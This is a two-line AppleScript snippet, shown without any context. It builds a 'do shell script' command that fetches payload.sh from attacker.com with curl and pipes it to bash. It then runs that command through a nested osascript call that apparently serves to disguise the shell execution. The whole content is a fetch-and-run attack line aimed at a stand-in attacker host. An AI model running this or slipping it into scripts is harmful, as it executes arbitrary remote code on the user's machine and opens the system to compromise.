set s to "do shell script \\\"curl -s http://attacker.com/payload.sh | bash\\\""
do shell script "osascript -e " & quoted form of s
